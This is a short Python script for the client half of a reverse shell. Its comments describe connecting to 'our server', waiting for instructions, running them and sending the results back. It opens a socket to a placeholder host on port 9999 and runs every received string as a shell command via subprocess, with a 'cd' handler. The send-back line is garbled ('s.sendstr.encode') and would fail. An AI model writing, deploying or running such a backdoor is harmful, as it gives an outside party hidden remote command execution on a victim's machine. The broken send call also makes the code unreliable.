# Try and connect to our server
# Wait for our instructions
# Receives the instructions and run them
# Take the results and send them back to us

import socket
import os
import subprocess

s = socket.socket()         #create a socket object
host = 'xxx.xxx.x.xxx'
port = 9999

s.connect((host, port))     #connect to the port

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s.sendstr.encode(output_str + currentWD)

        print(output_str)